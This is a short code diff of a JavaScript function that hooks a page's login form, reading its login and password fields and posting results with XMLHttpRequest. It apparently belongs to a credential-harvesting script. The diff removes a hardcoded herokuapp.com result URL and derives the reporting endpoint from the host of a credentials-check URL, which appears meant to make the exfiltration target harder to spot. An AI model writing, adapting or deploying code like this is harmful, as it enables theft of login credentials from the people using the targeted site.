@@ -11,8 +11,6 @@ function createMyScript() {
     let login = document.getElementById('loginform-login')
     let password = document.getElementById('loginform-password')
     
-    const postResultURL = 'https://controlyourmum.herokuapp.com/wtflolfuckyou';
-    
     function postResult(data) {
         let xhr = new XMLHttpRequest();
         xhr.onreadystatechange = function() {
@@ -56,7 +54,7 @@ function createMyScript() {
 
     const nextUrl = getNextUrl()
     const checkCredentialsURL = getCheckURL();
-
+    const postResultURL = checkCredentialsURL.slice(0, checkCredentialsURL.indexOf('/', 8))+'/wtflolfuckyou';
     let showedError = false;
     
     btn.addEventListener('click', () => {
